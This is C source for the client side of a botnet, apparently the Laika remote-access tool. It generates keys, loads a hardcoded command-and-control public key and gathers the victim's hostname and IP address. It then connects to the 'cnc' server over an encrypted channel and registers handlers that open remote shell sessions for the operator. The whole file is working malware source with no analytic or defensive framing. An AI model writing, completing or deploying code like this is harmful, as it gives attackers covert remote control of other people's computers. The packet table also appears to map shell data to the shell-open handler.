#include "lmem.h"
#include "lsodium.h"
#include "lerror.h"
#include "bot.h"
#include "shell.h"

void laikaB_handleHandshakeResponse(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
    struct sLaika_bot *bot = (struct sLaika_bot*)uData;
    uint8_t endianness = laikaS_readByte(&peer->sock);

    peer->sock.flipEndian = endianness != laikaS_isBigEndian();
    LAIKA_DEBUG("handshake accepted by cnc! got endian flag : %s\n", (endianness ? "TRUE" : "FALSE"));
}

struct sLaika_peerPacketInfo laikaB_pktTbl[LAIKAPKT_MAXNONE] = {
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_HANDSHAKE_RES,
        laikaB_handleHandshakeResponse,
        sizeof(uint8_t),
    false),
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_OPEN,
        laikaB_handleShellOpen,
        0,
    false),
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_CLOSE,
        laikaB_handleShellClose,
        0,
    false),
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_DATA,
        laikaB_handleShellOpen,
        0,
    true),
};

struct sLaika_bot *laikaB_newBot(void) {
    struct sLaika_bot *bot = laikaM_malloc(sizeof(struct sLaika_bot));
    struct hostent *host;
    char *tempIPBuf;
    size_t _unused;

    bot->shell = NULL;

    laikaP_initPList(&bot->pList);
    bot->peer = laikaS_newPeer(
        laikaB_pktTbl,
        &bot->pList,
        (void*)bot
    );

    /* generate keypair */
    if (sodium_init() < 0) {
        laikaB_freeBot(bot);
        LAIKA_ERROR("LibSodium failed to initialize!\n");
    }

    if (crypto_kx_keypair(bot->pub, bot->priv) != 0) {
        laikaB_freeBot(bot);
        LAIKA_ERROR("Failed to gen keypair!\n");
    }

    /* read cnc's public key into peerPub */
    if (sodium_hex2bin(bot->peer->peerPub, crypto_kx_PUBLICKEYBYTES, LAIKA_PUBKEY, strlen(LAIKA_PUBKEY), NULL, &_unused, NULL) != 0) {
        laikaB_freeBot(bot);
        LAIKA_ERROR("Failed to init cnc public key!\n");
    }

    /* grab hostname & ip info */
    if (SOCKETERROR(gethostname(bot->peer->hostname, LAIKA_HOSTNAME_LEN))) {
        laikaB_freeBot(bot);
        LAIKA_ERROR("gethostname() failed!\n");
    }

    if ((host = gethostbyname(bot->peer->hostname)) == NULL) {
        laikaB_freeBot(bot);
        LAIKA_ERROR("gethostbyname() failed!\n");
    }

    if ((tempIPBuf = inet_ntoa(*((struct in_addr*)host->h_addr_list[0]))) == NULL) {
        laikaB_freeBot(bot);
        LAIKA_ERROR("inet_ntoa() failed!\n");
    }

    /* copy ipv4 address info */
    strcpy(bot->peer->ipv4, tempIPBuf);
    return bot;
}

void laikaB_freeBot(struct sLaika_bot *bot) {
    int i;

    laikaP_cleanPList(&bot->pList);
    laikaS_freePeer(bot->peer);

    /* clear shell */
    if (bot->shell)
        laikaB_freeShell(bot, bot->shell);

    laikaM_free(bot);
}

void laikaB_connectToCNC(struct sLaika_bot *bot, char *ip, char *port) {
    struct sLaika_socket *sock = &bot->peer->sock;

    /* setup socket */
    laikaS_connect(sock, ip, port);
    laikaS_setNonBlock(sock);

    laikaP_addSock(&bot->pList, sock);

    /* queue handshake request */
    laikaS_startOutPacket(bot->peer, LAIKAPKT_HANDSHAKE_REQ);
    laikaS_write(sock, LAIKA_MAGIC, LAIKA_MAGICLEN);
    laikaS_writeByte(sock, LAIKA_VERSION_MAJOR);
    laikaS_writeByte(sock, LAIKA_VERSION_MINOR);
    laikaS_write(sock, bot->pub, sizeof(bot->pub)); /* write public key */
    laikaS_write(sock, bot->peer->hostname, LAIKA_HOSTNAME_LEN);
    laikaS_write(sock, bot->peer->ipv4, LAIKA_IPV4_LEN);
    laikaS_endOutPacket(bot->peer);
    laikaS_setSecure(bot->peer, true); /* after the cnc receives our handshake, our packets will be encrypted */

    if (crypto_kx_client_session_keys(bot->peer->inKey, bot->peer->outKey, bot->pub, bot->priv, bot->peer->peerPub) != 0)
        LAIKA_ERROR("failed to gen session key!\n");

    if (!laikaS_handlePeerOut(bot->peer))
        LAIKA_ERROR("failed to send handshake request!\n");
}

void laikaB_flushQueue(struct sLaika_bot *bot) {
    /* flush pList's outQueue */
    if (bot->pList.outCount > 0) {
        if (!laikaS_handlePeerOut(bot->peer))
            laikaS_kill(&bot->peer->sock);

        laikaP_resetOutQueue(&bot->pList);
    }
}

bool laikaB_poll(struct sLaika_bot *bot, int timeout) {
    struct sLaika_pollEvent *evnt;
    int numEvents;

    /* flush any events prior (eg. made by a task) */
    laikaB_flushQueue(bot);
    evnt = laikaP_poll(&bot->pList, timeout, &numEvents);

    if (numEvents == 0) /* no events? timeout was reached */
        return false;

LAIKA_TRY
    if (evnt->pollIn && !laikaS_handlePeerIn(bot->peer))
        goto _BOTKILL;

    if (evnt->pollOut && !laikaS_handlePeerOut(bot->peer))
        goto _BOTKILL;

    if (!evnt->pollIn && !evnt->pollOut)
        goto _BOTKILL;
LAIKA_CATCH
_BOTKILL:
    laikaS_kill(&bot->peer->sock);
LAIKA_TRYEND

    /* flush any events after (eg. made by a packet handler) */
    laikaB_flushQueue(bot);
    return true;
}